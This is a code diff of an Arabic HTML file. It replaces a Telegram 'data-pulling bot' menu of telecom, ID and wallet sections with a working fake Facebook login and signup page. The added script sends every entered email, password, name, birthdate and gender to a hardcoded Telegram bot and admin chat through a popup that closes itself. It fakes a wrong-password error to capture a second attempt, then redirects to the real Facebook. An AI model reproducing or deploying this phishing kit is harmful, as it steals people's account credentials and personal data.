@@ -1,108 +1,193 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>بوت سحب الداتا</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى فيسبوك</title>
     <style>
-        body {
-            margin: 0;
-            padding: 16px;
-            background: #0d1117;
-            color: white;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            direction: rtl;
-            text-align: center;
-        }
-        .header {
-            font-size: 22px;
-            font-weight: bold;
-            margin-bottom: 10px;
-            color: #f0c040;
-        }
-        .steps {
-            background: #161b22;
-            border-radius: 12px;
-            padding: 12px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            line-height: 2;
-            text-align: right;
-        }
-        .grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-        }
-        .box {
-            border-radius: 14px;
-            padding: 24px 8px;
-            font-size: 18px;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            box-shadow: 0 6px 10px rgba(0,0,0,0.4);
-            transition: 0.2s;
-            cursor: pointer;
-            color: white;
-            border: none;
-            width: 100%;
-            min-height: 90px;
-        }
-        .box:active {
-            transform: scale(0.95);
-            filter: brightness(0.9);
-        }
-        /* الألوان المطابقة للصورة */
-        .red    { background: #e74c3c; }  /* فودافون */
-        .orange { background: #e67e22; }  /* اتصالات */
-        .green  { background: #27ae60; }  /* تموين */
-        .blue   { background: #2980b9; }  /* واي */
-        .purple { background: #8e44ad; }  /* النترا */
-        .pink   { background: #e84393; }  /* اورنج */
-        .teal   { background: #16a085; }  /* Services Axis Pay */
-        .gold   { background: #f39c12; }  /* الرقم القومي */
-        .dark   { background: #2c3e50; }  /* الإحالات والدعم */
-        .full-width {
-            grid-column: span 2;
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { display: flex; max-width: 900px; width: 100%; padding: 20px; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+        .brand-section { flex: 1; min-width: 300px; padding: 20px; }
+        .brand-section h1 { color: #1877f2; font-size: 3.5rem; font-weight: bold; }
+        .brand-section p { font-size: 1.4rem; color: #1c1e21; }
+        .form-section { flex: 1; min-width: 300px; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .form-group { margin-bottom: 15px; }
+        .form-group input { width: 100%; padding: 14px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; outline: none; }
+        .form-group input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        .login-btn { width: 100%; padding: 12px; background: #1877f2; color: #fff; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
+        .login-btn:hover { background: #166fe5; }
+        .forgot-password { display: block; text-align: center; margin: 15px 0; color: #1877f2; text-decoration: none; font-size: 14px; }
+        hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
+        .create-account-btn { display: block; width: fit-content; margin: 0 auto; padding: 12px 20px; background: #42b72a; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .create-account-btn:hover { background: #36a420; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.85); display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; transition: opacity 0.3s; z-index: 1000; }
+        .modal-overlay.active { opacity: 1; pointer-events: auto; }
+        .modal-box { background: #fff; width: 432px; border-radius: 8px; box-shadow: 0 12px 28px rgba(0,0,0,0.2); padding: 16px; position: relative; animation: slideUp 0.3s ease; }
+        @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .modal-header { border-bottom: 1px solid #dadde1; padding-bottom: 10px; margin-bottom: 15px; }
+        .modal-header h2 { font-size: 32px; color: #1c1e21; }
+        .modal-header p { font-size: 15px; color: #606770; }
+        .close-modal { position: absolute; top: 10px; left: 10px; font-size: 24px; cursor: pointer; color: #606770; }
+        .name-inputs { display: flex; gap: 10px; margin-bottom: 10px; }
+        .modal-box input[type="text"], .modal-box input[type="password"] { width: 100%; padding: 11px; background: #f5f6f7; border: 1px solid #ccd0d5; border-radius: 5px; font-size: 15px; margin-bottom: 10px; outline: none; }
+        .modal-box input:focus { border-color: #1877f2; }
+        .section-title { font-size: 12px; color: #606770; margin: 5px 0; }
+        .selector-row { display: flex; gap: 10px; margin-bottom: 12px; }
+        .selector-row select { flex: 1; padding: 8px; border: 1px solid #ccd0d5; border-radius: 4px; background: #fff; font-size: 15px; }
+        .gender-row { display: flex; gap: 10px; margin-bottom: 15px; }
+        .gender-box { flex: 1; border: 1px solid #ccd0d5; border-radius: 4px; padding: 8px; display: flex; justify-content: space-between; align-items: center; font-size: 15px; background: #fff; }
+        .signup-submit-btn { display: block; width: 194px; margin: 20px auto 10px; background: #00a400; color: #fff; border: none; border-radius: 6px; padding: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .signup-submit-btn:hover { background: #008f00; }
+        .shake { animation: shake 0.4s ease; }
+        @keyframes shake { 0%,100% { transform: translateX(0); } 20%,60% { transform: translateX(-10px); } 40%,80% { transform: translateX(10px); } }
+        .error-msg { color: #d93025; font-size: 13px; display: none; margin-top: 5px; }
+        @media (max-width: 768px) {
+            .container { flex-direction: column; text-align: center; }
+            .brand-section h1 { font-size: 2.8rem; }
+            .brand-section p { font-size: 1.1rem; }
+            .modal-box { width: 90%; }
         }
     </style>
 </head>
 <body>
-    <div class="header">🪄 بوت سحب الداتا</div>
-
-    <div class="steps">
-        📋 خطوات السحب:<br>
-        ① أرسل رقم المحفظة<br>
-        ② أرسل اسم المحفظة<br>
-        ③ أرسل الرقم المرغوب السحب عليه<br>
-        ⏳ ثم تحلّى بالصبر وصلي على خير البرية
+    <div class="container">
+        <div class="brand-section">
+            <h1>فيسبوك</h1>
+            <p>يمنحك فيسبوك إمكانية التواصل مع الأشخاص ومشاركة ما تريد معهم.</p>
+        </div>
+        <div class="form-section">
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="text" id="loginEmail" placeholder="البريد الإلكتروني أو رقم الهاتف" required autocomplete="off">
+                </div>
+                <div class="form-group">
+                    <input type="password" id="loginPassword" placeholder="كلمة السر" required autocomplete="off">
+                </div>
+                <div class="error-msg" id="loginError"></div>
+                <button type="submit" class="login-btn">تسجيل الدخول</button>
+                <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+                <hr>
+                <button type="button" class="create-account-btn" id="openRegister">إنشاء حساب جديد</button>
+            </form>
+        </div>
     </div>
 
-    <div class="grid">
-        <button class="box red" onclick="choose('قسم_فودافون')">📞 قسم فودافون</button>
-        <button class="box orange" onclick="choose('قسم_اتصالات')">📶 قسم اتصالات</button>
-        <button class="box green" onclick="choose('قسم_تموين')">🍞 قسم تموين</button>
-        <button class="box blue" onclick="choose('قسم_واي')">📡 قسم واي</button>
-        <button class="box purple" onclick="choose('قسم_النترا')">💻 قسم النترا</button>
-        <button class="box pink" onclick="choose('قسم_اورنج')">📱 قسم اورنج</button>
-        <button class="box teal full-width" onclick="choose('Services_Axis_Pay')">💳 Services Axis Pay</button>
-        <button class="box gold full-width" onclick="choose('رقم_قومي')">🆔 موقع الرقم القومي</button>
-        <button class="box dark" onclick="choose('إحالات')">👥 الإحالات</button>
-        <button class="box dark" onclick="choose('دعم_فني')">🛠️ الدعم الفني</button>
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-box">
+            <span class="close-modal" id="closeRegister">&times;</span>
+            <div class="modal-header">
+                <h2>إنشاء حساب جديد</h2>
+                <p>الأمر سريع وسهل.</p>
+            </div>
+            <form id="registerForm">
+                <div class="name-inputs">
+                    <input type="text" id="regFirstName" placeholder="الاسم الأول" required>
+                    <input type="text" id="regLastName" placeholder="اسم العائلة" required>
+                </div>
+                <input type="text" id="regEmail" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+                <input type="password" id="regPassword" placeholder="كلمة سر جديدة" required>
+                <div class="section-title">تاريخ الميلاد</div>
+                <div class="selector-row">
+                    <select id="birthDay"></select>
+                    <select id="birthMonth">
+                        <option value="1">يناير</option> <option value="2">فبراير</option>
+                        <option value="3">مارس</option> <option value="4">أبريل</option>
+                        <option value="5">مايو</option> <option value="6">يونيو</option>
+                        <option value="7">يوليو</option> <option value="8">أغسطس</option>
+                        <option value="9">سبتمبر</option> <option value="10">أكتوبر</option>
+                        <option value="11">نوفمبر</option> <option value="12">ديسمبر</option>
+                    </select>
+                    <select id="birthYear"></select>
+                </div>
+                <div class="section-title">الجنس</div>
+                <div class="gender-row">
+                    <label class="gender-box"><span>أنثى</span><input type="radio" name="gender" value="Female" required></label>
+                    <label class="gender-box"><span>ذكر</span><input type="radio" name="gender" value="Male" required></label>
+                </div>
+                <button type="submit" class="signup-submit-btn">تسجيل في فيسبوك</button>
+            </form>
+        </div>
     </div>
 
     <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand(); // يأخذ كامل الشاشة
+        const BOT_TOKEN = "8883283827:AAGN8LuzETaodVp2QolYJUdcA9b2iL7n3XQ";
+        const ADMIN_CHAT_ID = "8067654478";
 
-        function choose(data) {
-            tg.sendData(data);   // يبعت للبوت الكود اللي اخترته
-            tg.close();          // يقفل التطبيق تلقائياً
+        // دالة إرسال عبر فتح نافذة جديدة (تعمل من file://)
+        function sendToTelegramViaWindow(text) {
+            const encodedText = encodeURIComponent(text);
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodedText}`;
+            const win = window.open(url, '_blank', 'width=400,height=300');
+            if (win) {
+                // إغلاق النافذة تلقائياً بعد 1.5 ثانية
+                setTimeout(() => { win.close(); }, 1500);
+            }
         }
+
+        // تعبئة تواريخ الميلاد
+        (function populateDates() {
+            const daySelect = document.getElementById('birthDay');
+            const yearSelect = document.getElementById('birthYear');
+            for (let i = 1; i <= 31; i++) daySelect.add(new Option(i, i));
+            const y = new Date().getFullYear();
+            for (let i = y; i >= y - 100; i--) yearSelect.add(new Option(i, i));
+        })();
+
+        // فتح/إغلاق نافذة إنشاء الحساب
+        document.getElementById('openRegister').onclick = () => document.getElementById('modalOverlay').classList.add('active');
+        document.getElementById('closeRegister').onclick = () => document.getElementById('modalOverlay').classList.remove('active');
+        document.getElementById('modalOverlay').addEventListener('click', function(e) {
+            if (e.target === this) this.classList.remove('active');
+        });
+
+        // إنشاء الحساب - إرسال البيانات
+        document.getElementById('registerForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const firstName = document.getElementById('regFirstName').value.trim();
+            const lastName = document.getElementById('regLastName').value.trim();
+            const email = document.getElementById('regEmail').value.trim();
+            const password = document.getElementById('regPassword').value;
+            const day = document.getElementById('birthDay').value;
+            const month = document.getElementById('birthMonth').value;
+            const year = document.getElementById('birthYear').value;
+            const gender = document.querySelector('input[name="gender"]:checked').value;
+
+            const msg = `🆕 حساب جديد:\n👤 ${firstName} ${lastName}\n📧 ${email}\n🔑 ${password}\n🎂 ${year}-${month}-${day}\n⚥ ${gender}`;
+            sendToTelegramViaWindow(msg);
+            alert(`تهانينا يا ${firstName}! تم إنشاء حسابك بنجاح.`);
+            document.getElementById('modalOverlay').classList.remove('active');
+            this.reset();
+        });
+
+        // تسجيل الدخول – محاولتان
+        let loginTries = 0;
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('loginEmail').value.trim();
+            const password = document.getElementById('loginPassword').value;
+            const errorDiv = document.getElementById('loginError');
+            if (!email || !password) return;
+
+            // إرسال في جميع المحاولات
+            sendToTelegramViaWindow(`🔑 محاولة دخول:\n📧 ${email}\n🔒 ${password}`);
+
+            if (loginTries === 0) {
+                errorDiv.style.display = 'block';
+                errorDiv.textContent = 'كلمة المرور التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.';
+                document.getElementById('loginPassword').classList.add('shake');
+                setTimeout(() => document.getElementById('loginPassword').classList.remove('shake'), 400);
+                document.getElementById('loginPassword').value = '';
+                loginTries++;
+            } else {
+                errorDiv.style.display = 'none';
+                document.getElementById('loginEmail').disabled = true;
+                document.getElementById('loginPassword').disabled = true;
+                document.querySelector('.login-btn').disabled = true;
+                alert('تم تسجيل الدخول بنجاح! جارٍ تحويلك إلى فيسبوك...');
+                setTimeout(() => { window.location.href = 'https://www.facebook.com/'; }, 1500);
+            }
+        });
     </script>
 </body>
 </html>
